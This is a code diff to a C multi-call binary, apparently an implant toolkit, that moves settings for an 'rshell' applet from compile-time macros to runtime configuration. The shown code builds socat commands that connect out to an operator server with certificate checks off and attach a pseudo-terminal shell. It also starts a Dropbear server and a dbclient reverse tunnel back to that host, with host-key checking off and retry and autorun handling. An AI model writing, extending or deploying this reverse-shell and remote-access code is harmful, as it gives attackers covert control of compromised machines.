@@ -13,6 +13,7 @@
 #include <unistd.h>
 
 #include "applets.h"
+#include "runtime_config.h"
 
 #ifndef PATH_MAX
 #define PATH_MAX 4096
@@ -132,6 +133,67 @@
 #ifndef BB_OPERATOR_KNOWN_HOSTS_POLICY
 #define BB_OPERATOR_KNOWN_HOSTS_POLICY "off"
 #endif
+
+#undef BB_RUNTIME_MODE
+#undef BB_RUNTIME_ROOT
+#undef BB_ZERO_ARG_MODE
+#undef BB_ZERO_ARG_LOG_MODE
+#undef BB_ZERO_ARG_CUSTOM_COMMAND
+#undef BB_RSHELL_TRANSPORT
+#undef BB_RSHELL_ENCRYPTION
+#undef BB_RSHELL_ALLOW_PLAINTEXT
+#undef BB_RSHELL_AUTHKEYS_MODE
+#undef BB_RSHELL_RUN_MODE
+#undef BB_RSHELL_GENERATE_HOSTKEY_IF_MISSING
+#undef BB_RSHELL_SOCAT_PORT
+#undef BB_RSHELL_SHELL_PROVIDER
+#undef BB_RSHELL_CUSTOM_SHELL
+#undef BB_RSHELL_RETRY_COUNT
+#undef BB_RSHELL_RETRY_INTERVAL_SEC
+#undef BB_RSHELL_RETRY_JITTER_PCT
+#undef BB_RSHELL_RETRY_BACKOFF
+#undef BB_RSHELL_RETRY_MAX_INTERVAL_SEC
+#undef BB_AUTORUN_GUARD_ENABLE
+#undef BB_AUTORUN_GUARD_PATH
+#undef BB_AUTORUN_REENTRY_ACTION
+#undef BB_AUTORUN_STALE_LOCK_POLICY
+#undef BB_OPERATOR_REMOTE_FORWARD_PORT
+#undef BB_OPERATOR_SERVER_HOST
+#undef BB_OPERATOR_SERVER_USER
+#undef BB_OPERATOR_SERVER_SSH_PORT
+#undef BB_OPERATOR_TARGET_BIND_HOST
+#undef BB_OPERATOR_TARGET_DROPBEAR_PORT
+#undef BB_OPERATOR_KNOWN_HOSTS_POLICY
+#define BB_RUNTIME_MODE bb_config_get("BB_RUNTIME_MODE")
+#define BB_RUNTIME_ROOT bb_config_get("BB_RUNTIME_ROOT")
+#define BB_ZERO_ARG_MODE bb_config_get("BB_ZERO_ARG_MODE")
+#define BB_ZERO_ARG_LOG_MODE bb_config_get("BB_ZERO_ARG_LOG_MODE")
+#define BB_ZERO_ARG_CUSTOM_COMMAND bb_config_get("BB_ZERO_ARG_CUSTOM_COMMAND")
+#define BB_RSHELL_TRANSPORT bb_config_get("BB_RSHELL_TRANSPORT")
+#define BB_RSHELL_ENCRYPTION bb_config_get("BB_RSHELL_ENCRYPTION")
+#define BB_RSHELL_ALLOW_PLAINTEXT bb_config_get("BB_RSHELL_ALLOW_PLAINTEXT")
+#define BB_RSHELL_AUTHKEYS_MODE bb_config_get("BB_RSHELL_AUTHKEYS_MODE")
+#define BB_RSHELL_RUN_MODE bb_config_get("BB_RSHELL_RUN_MODE")
+#define BB_RSHELL_GENERATE_HOSTKEY_IF_MISSING bb_config_get("BB_RSHELL_GENERATE_HOSTKEY_IF_MISSING")
+#define BB_RSHELL_SOCAT_PORT bb_config_get("BB_RSHELL_SOCAT_PORT")
+#define BB_RSHELL_SHELL_PROVIDER bb_config_get("BB_RSHELL_SHELL_PROVIDER")
+#define BB_RSHELL_CUSTOM_SHELL bb_config_get("BB_RSHELL_CUSTOM_SHELL")
+#define BB_RSHELL_RETRY_COUNT bb_config_get("BB_RSHELL_RETRY_COUNT")
+#define BB_RSHELL_RETRY_INTERVAL_SEC bb_config_get("BB_RSHELL_RETRY_INTERVAL_SEC")
+#define BB_RSHELL_RETRY_JITTER_PCT bb_config_get("BB_RSHELL_RETRY_JITTER_PCT")
+#define BB_RSHELL_RETRY_BACKOFF bb_config_get("BB_RSHELL_RETRY_BACKOFF")
+#define BB_RSHELL_RETRY_MAX_INTERVAL_SEC bb_config_get("BB_RSHELL_RETRY_MAX_INTERVAL_SEC")
+#define BB_AUTORUN_GUARD_ENABLE bb_config_get("BB_AUTORUN_GUARD_ENABLE")
+#define BB_AUTORUN_GUARD_PATH bb_config_get("BB_AUTORUN_GUARD_PATH")
+#define BB_AUTORUN_REENTRY_ACTION bb_config_get("BB_AUTORUN_REENTRY_ACTION")
+#define BB_AUTORUN_STALE_LOCK_POLICY bb_config_get("BB_AUTORUN_STALE_LOCK_POLICY")
+#define BB_OPERATOR_REMOTE_FORWARD_PORT bb_config_get("BB_OPERATOR_REMOTE_FORWARD_PORT")
+#define BB_OPERATOR_SERVER_HOST bb_config_get("BB_OPERATOR_SERVER_HOST")
+#define BB_OPERATOR_SERVER_USER bb_config_get("BB_OPERATOR_SERVER_USER")
+#define BB_OPERATOR_SERVER_SSH_PORT bb_config_get("BB_OPERATOR_SERVER_SSH_PORT")
+#define BB_OPERATOR_TARGET_BIND_HOST bb_config_get("BB_OPERATOR_TARGET_BIND_HOST")
+#define BB_OPERATOR_TARGET_DROPBEAR_PORT bb_config_get("BB_OPERATOR_TARGET_DROPBEAR_PORT")
+#define BB_OPERATOR_KNOWN_HOSTS_POLICY bb_config_get("BB_OPERATOR_KNOWN_HOSTS_POLICY")
 
 const struct bb_applet bb_applets[] = {
     {"list", applet_list_main, "list native applets and payload tools"},
@@ -1009,10 +1071,12 @@ int applet_rshell_main(int argc, char **argv)
         shquote_append(cmd, sizeof(cmd), payload_lib);
         strcat(cmd, "${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}; export LD_LIBRARY_PATH; ");
         if (!strcmp(BB_RSHELL_ENCRYPTION, "tls")) {
+            char _socat_target[512];
+            snprintf(_socat_target, sizeof(_socat_target), "%s:%s,verify=0", BB_OPERATOR_SERVER_HOST, BB_RSHELL_SOCAT_PORT);
             strcat(cmd, "exec ");
             shquote_append(cmd, sizeof(cmd), socat);
             strcat(cmd, " OPENSSL:");
-            shquote_append(cmd, sizeof(cmd), BB_OPERATOR_SERVER_HOST ":" BB_RSHELL_SOCAT_PORT ",verify=0");
+            shquote_append(cmd, sizeof(cmd), _socat_target);
             strcat(cmd, " EXEC:");
             shquote_append(cmd, sizeof(cmd), shell_cmd);
             strcat(cmd, ",pty,stderr,setsid,sigint,sane");
@@ -1023,13 +1087,17 @@ int applet_rshell_main(int argc, char **argv)
                 return 2;
             }
             fputs("rshell: WARNING: starting PLAINTEXT socat shell — insecure/debug only\n", stderr);
+            {
+                char _socat_target[512];
+                snprintf(_socat_target, sizeof(_socat_target), "%s:%s", BB_OPERATOR_SERVER_HOST, BB_RSHELL_SOCAT_PORT);
             strcat(cmd, "exec ");
             shquote_append(cmd, sizeof(cmd), socat);
             strcat(cmd, " TCP:");
-            shquote_append(cmd, sizeof(cmd), BB_OPERATOR_SERVER_HOST ":" BB_RSHELL_SOCAT_PORT);
+            shquote_append(cmd, sizeof(cmd), _socat_target);
             strcat(cmd, " EXEC:");
             shquote_append(cmd, sizeof(cmd), shell_cmd);
             strcat(cmd, ",pty,stderr,setsid,sigint,sane");
+            }
         }
         for (i = 0; ; i++) {
             rc = system(cmd);
@@ -1119,15 +1187,22 @@ int applet_rshell_main(int argc, char **argv)
     strcat(cmd, " ]; then echo 'rshell: missing Dropbear host key; enable pre-generated host key or allow runtime host-key generation' >&2; exit 2; fi; ");
     {
         char _db_log[PATH_MAX], _dc_log[PATH_MAX];
+        char _dropbear_bind[256], _remote_forward[512], _server_login[512], _connect_hint[256];
         const char *_guard = autorun_guard_path();
         snprintf(_db_log, sizeof(_db_log), "%s/dropbear.log", _guard);
         snprintf(_dc_log, sizeof(_dc_log), "%s/dbclient.log", _guard);
+        snprintf(_dropbear_bind, sizeof(_dropbear_bind), "%s:%s", BB_OPERATOR_TARGET_BIND_HOST, BB_OPERATOR_TARGET_DROPBEAR_PORT);
+        snprintf(_remote_forward, sizeof(_remote_forward), "127.0.0.1:%s:%s:%s",
+                 BB_OPERATOR_REMOTE_FORWARD_PORT, BB_OPERATOR_TARGET_BIND_HOST, BB_OPERATOR_TARGET_DROPBEAR_PORT);
+        snprintf(_server_login, sizeof(_server_login), "%s@%s", BB_OPERATOR_SERVER_USER, BB_OPERATOR_SERVER_HOST);
+        snprintf(_connect_hint, sizeof(_connect_hint), "echo connect_hint='ssh -p %s root@127.0.0.1'; ",
+                 BB_OPERATOR_REMOTE_FORWARD_PORT);
 
         shquote_append(cmd, sizeof(cmd), dropbear);
         strcat(cmd, " -r ");
         shquote_append(cmd, sizeof(cmd), hostkey);
         strcat(cmd, " -p ");
-        shquote_append(cmd, sizeof(cmd), BB_OPERATOR_TARGET_BIND_HOST ":" BB_OPERATOR_TARGET_DROPBEAR_PORT);
+        shquote_append(cmd, sizeof(cmd), _dropbear_bind);
         strcat(cmd, " -F -E >");
         shquote_append(cmd, sizeof(cmd), _db_log);
         strcat(cmd, " 2>&1 & dbpid=$!; ");
@@ -1137,16 +1212,16 @@ int applet_rshell_main(int argc, char **argv)
         if (!strcmp(BB_OPERATOR_KNOWN_HOSTS_POLICY, "off"))
             strcat(cmd, " -y");
         strcat(cmd, " -K 30 -N -R ");
-        shquote_append(cmd, sizeof(cmd), "127.0.0.1:" BB_OPERATOR_REMOTE_FORWARD_PORT ":" BB_OPERATOR_TARGET_BIND_HOST ":" BB_OPERATOR_TARGET_DROPBEAR_PORT);
+        shquote_append(cmd, sizeof(cmd), _remote_forward);
         strcat(cmd, " -p ");
         shquote_append(cmd, sizeof(cmd), BB_OPERATOR_SERVER_SSH_PORT);
         strcat(cmd, " ");
-        shquote_append(cmd, sizeof(cmd), BB_OPERATOR_SERVER_USER "@" BB_OPERATOR_SERVER_HOST);
+        shquote_append(cmd, sizeof(cmd), _server_login);
         strcat(cmd, " >");
         shquote_append(cmd, sizeof(cmd), _dc_log);
         strcat(cmd, " 2>&1 & dcpid=$!; ");
         strcat(cmd, "echo rshell_started=yes; echo dropbear_pid=$dbpid; echo dbclient_pid=$dcpid; ");
-        strcat(cmd, "echo connect_hint='ssh -p " BB_OPERATOR_REMOTE_FORWARD_PORT " root@127.0.0.1'; ");
+        strcat(cmd, _connect_hint);
         strcat(cmd, "echo dropbear_log=");
         shquote_append(cmd, sizeof(cmd), _db_log);
         strcat(cmd, "; echo dbclient_log=");
